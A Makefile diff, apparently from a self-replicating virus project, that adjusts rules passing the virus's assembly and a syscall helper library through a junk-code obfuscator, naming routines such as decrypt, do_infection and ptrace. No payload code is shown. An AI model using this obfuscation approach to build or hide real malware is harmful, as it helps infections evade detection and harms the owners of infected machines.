@@ -58,10 +58,13 @@ $(TMP_DIR)/%.s: $(SRC_DIR)/%.c | $(OBJ_DIR) $(TMP_LIB_DIR)
 ##
 
 $(TMP_DIR)/virus.s.g.s: $(TMP_DIR)/virus.s
-	./scripts/add_garbage $< --labels entry decrypt -p 10000
+	#cp $< $@
+	# nm --defined-only .tmp/obj/virus.o | grep -v '\.' | grep -i ' t ' | cut -d ' ' -f 3
+	./scripts/add_garbage $< -p 200 -l decrypt do_infection entry virus
 
 $(TMP_DIR)/lib/lib.s.g.s: $(TMP_DIR)/lib/lib.s
-	./scripts/add_garbage $< --labels open read write call -p 10000
+	#cp $< $@
+	./scripts/add_garbage $< -p 200 -l add_base call close contains d_isdir d_isfile execve exit ffree fget fork fput free getdents getenv getpid lseek malloc _malloc malloc_shared open print println printnb printnbln ptrace read restore_rt scmp signal slen snbr sncmp startswith str_equal waitpid write xstat
 
 ##
 ## END
